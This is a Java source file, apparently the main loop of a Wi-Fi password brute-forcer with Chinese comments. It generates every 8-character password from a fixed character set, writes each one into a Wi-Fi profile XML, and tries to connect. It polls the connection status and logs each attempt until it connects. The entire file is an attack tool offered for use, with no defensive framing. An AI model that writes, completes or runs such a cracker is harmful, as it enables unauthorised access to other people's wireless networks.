package com;

import java.math.BigDecimal;
import java.util.Arrays;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class WifiAction {

	private static Logger logger = LogManager.getLogger(WifiAction.class);

	public static void main(String[] args) throws Exception {

		// 字串組合
		String psStr = "0123456789abcdefghijklmnoparstuvwxyzABCDEFGHIJKLMNOPARSTUVWXYZ!@#$%";

		// 長度
		int psSize = 8;

		// Wi-Fi 配置檔路徑
		String profilePath = "D:/wifi.xml";
		
		// 配置檔名稱
		String profileName = "Jun";

		PassWordService pwService = new PassWordService(psStr, psSize);
		ProcessRate proRate = new ProcessRate(psStr, psSize);

		String pw;

		while ((pw = pwService.next()) != null) {
			// 產出xml
			String xmlPath = XmlTemp.getXmlTemp(profileName, pw, profilePath);
			// 連接
			ConnectWifi.toConn(profilePath, profileName);

			// 取得資訊
			String info = WifiInfo.getInfo();

			while (info.contains("正在驗證") || info.contains("正在產生關聯")) {
				Thread.sleep(500);
				info = WifiInfo.getInfo();
			}

			String rate = proRate.getRate();

			System.out.println(rate + "\t" + pw + "\t" + info + "\t" + Arrays.toString(pwService.getIndexPosition()));
			logger.info(rate + "\t" + pw + "\t" + info + "\t" + Arrays.toString(pwService.getIndexPosition()));
			if (info.contains(":連線")) {
				System.out.println("結束");
				break;
			}
		}
		System.out.println("結束");
	}
}
